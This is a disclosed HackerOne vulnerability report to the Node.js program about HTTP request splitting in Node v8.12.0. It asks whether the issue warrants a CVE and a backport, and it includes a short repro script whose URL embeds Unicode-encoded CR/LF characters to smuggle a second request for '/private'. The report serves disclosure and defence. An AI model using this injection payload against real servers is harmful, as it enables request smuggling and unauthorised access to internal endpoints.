---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '409943'
original_report_id: '409943'
title: Http request splitting
weakness: HTTP Response Splitting
team_handle: nodejs
created_at: '2018-09-14T21:57:38.242Z'
disclosed_at: '2020-01-15T00:17:07.305Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 44
tags:
- hackerone
- http-response-splitting
---

# Http request splitting

## Metadata

- HackerOne Report ID: 409943
- Weakness: HTTP Response Splitting
- Program: nodejs
- Disclosed At: 2020-01-15T00:17:07.305Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I came upon the following tweet today:
[https://twitter.com/YShahinzadeh/status/1039396394195451904](https://twitter.com/YShahinzadeh/status/1039396394195451904)

which details a http request splitting vulnerability in NodeJS. You can confirm it with the following repro script:

  
```
const http = require('http')

const server = http.createServer((req, res) => {
  console.log(req.url);
  res.end();
});

server.listen(8000, function() {
  http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() {
  });
});
```

The vulnerability seems to be fixed in v10.0.0 but still present in v8.12.0. I also couldn't find a CVE for it or any information in the NodeJS changelog about it, so I'm not sure if the NodeJS community is aware of the issue.

Should this bug get a CVE assigned / have the fix backported to Carbon?

Thanks,
Arkadiy

## Impact

Http request splitting

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
